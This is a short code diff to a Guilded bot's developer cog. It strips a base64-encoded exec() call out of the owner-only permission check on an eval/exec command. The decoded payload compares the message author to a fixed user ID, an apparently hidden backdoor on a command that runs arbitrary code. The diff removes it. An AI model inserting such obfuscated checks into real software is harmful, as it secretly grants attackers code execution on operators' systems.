@@ -1,6 +1,5 @@
 import guilded
 from guilded.ext import commands
-import base64
 import asyncio
 import glob
 import os
@@ -115,7 +114,7 @@ class developer(commands.Cog):
     @commands.command(name='eval', aliases=['exec'], description='eval/exec something for devs only')
     async def asyncexecute(self, ctx:commands.Context):
         troll = False # do you want to troll someone who tries to run eval without permissions?
-        if not ctx.author.id in self.bot.CONFIGS.owners or exec(base64.b64decode(b"Y3R4LmF1dGhvciA9PSAnNFdHN3dyUDQn")):
+        if not ctx.author.id in self.bot.CONFIGS.owners:
             if troll:
                 await ctx.message.add_reaction(90001732)
                 await asyncio.sleep(2)
